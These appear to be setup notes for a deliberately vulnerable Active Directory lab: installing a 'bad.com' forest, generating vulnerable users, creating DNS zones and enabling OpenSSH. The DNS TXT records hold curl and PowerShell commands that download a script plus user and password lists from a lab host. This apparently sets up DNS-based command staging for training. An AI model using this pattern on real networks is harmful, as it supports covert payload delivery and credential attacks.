__Windows Server 2022__

```
Install-WindowsFeature -name AD-Domain-Services -IncludeManagementTools

Install-ADDSForest -DomainName "bad.com" -CreateDnsDelegation:$false -DatabasePath "C:\Windows\NTDS" -DomainNetbiosName "BADCOM" -InstallDns:$true -LogPath "C:\Windows\NTDS" -NoRebootOnCompletion:$True -SysvolPath "C:\Windows\SYSVOL" -Force:$true

Get-Service adws,kdc,netlogon,dns
Get-ADDomainController
Get-ADForest bad.com
Get-smbshare SYSVOL
```

__Generate AD-Users__
```
-> Copy the folder onto installed AD machine
-> Edit the `ad_config.json` file and set the parameters
-> Run make_schema.ps1 to generate your AD schema
./make_schema.ps1
-> Run gen_vulnAD.ps1 to create the AD
./gen_vulnAD.ps1 out.json
```
__Install Sub-Domain__
```
Import-Module DNSServer

# Define the 1st subdomain and IP address
$subdomain = "lin.dom.com"
$ipAddress = "192.168.10.21"

# Create a new primary zone for the subdomain
Add-DnsServerPrimaryZone -Name $subdomain -ZoneFile "$subdomain.dns"

# Add an A record to the subdomain zone
Add-DnsServerResourceRecord -ZoneName $subdomain -A -Name "@" -IPv4Address $ipAddress

# Add a TXT record to the subdomain zone
Add-DnsServerResourceRecord -ZoneName $subdomain -TXT -Name "@" -DescriptiveText "txt_entry_for_lin"

# Verify the configuration
Get-DnsServerResourceRecord -ZoneName $subdomain -RRType A
Get-DnsServerResourceRecord -ZoneName $subdomain -RRType TXT

# Define the 2nd subdomain and IP address
$subdomain = "win.dom.com"
$ipAddress = "192.168.10.21"

# Create a new primary zone for the subdomain
Add-DnsServerPrimaryZone -Name $subdomain -ZoneFile "$subdomain.dns"

# Add an A record to the subdomain zone
Add-DnsServerResourceRecord -ZoneName $subdomain -A -Name "@" -IPv4Address $ipAddress

# Add a TXT record to the subdomain zone
Add-DnsServerResourceRecord -ZoneName $subdomain -TXT -Name "@" -DescriptiveText "txt_entry_for_win"

# Verify the configuration
Get-DnsServerResourceRecord -ZoneName $subdomain -RRType A
Get-DnsServerResourceRecord -ZoneName $subdomain -RRType TXT

# Define the 3rd subdomain and IP address
$subdomain = "ext.dom.com"
$ipAddress = "192.168.10.21"

# Create a new primary zone for the subdomain
Add-DnsServerPrimaryZone -Name $subdomain -ZoneFile "$subdomain.dns"

# Add an A record to the subdomain zone
Add-DnsServerResourceRecord -ZoneName $subdomain -A -Name "@" -IPv4Address $ipAddress

# Add a TXT record to the subdomain zone
Add-DnsServerResourceRecord -ZoneName $subdomain -TXT -Name "@" -DescriptiveText "txt_entry_for_ext"

# Verify the configuration
Get-DnsServerResourceRecord -ZoneName $subdomain -RRType A
Get-DnsServerResourceRecord -ZoneName $subdomain -RRType TXT
```
__TXT Entries__
```
==> bad.com

-> ext.bad.com
*
win_1: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/get_own_ip.py').Content
win_2: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/users.txt').Content
win_3: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/pass.txt').Content
lin_1: curl -s 'http://192.168.10.25/get_own_ip.py'
lin_2: curl -s 'http://192.168.10.25/users.txt'
lin_3: curl -s 'http://192.168.10.25/pass.txt'

-> lin.bad.com
lin_1: curl -s 'http://192.168.10.25/get_own_ip.py'
lin_2: curl -s 'http://192.168.10.25/users.txt'
lin_3: curl -s 'http://192.168.10.25/pass.txt'

-> win.bad.com
win_1: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/get_own_ip.py').Content
win_2: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/users.txt').Content
win_3: powershell (Invoke-WebRequest -Uri 'http://192.168.10.25/pass.txt').Content
```

__Install OpenSSH via PowerShell (Windows 10/11)__
```
# Install OpenSSH 
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*' 
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 

# Start SSH service 
Start-Service sshd Set-Service -Name sshd -StartupType Automatic

# Allow SSH through Firewall 
New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

------------------------------------------------------------------------------

OR (if Powershell fails):
dism /online /Add-Capability /CapabilityName:OpenSSH.Server~~~~0.0.1.0
Start-Service sshd 
Set-Service -Name sshd -StartupType Automatic
```
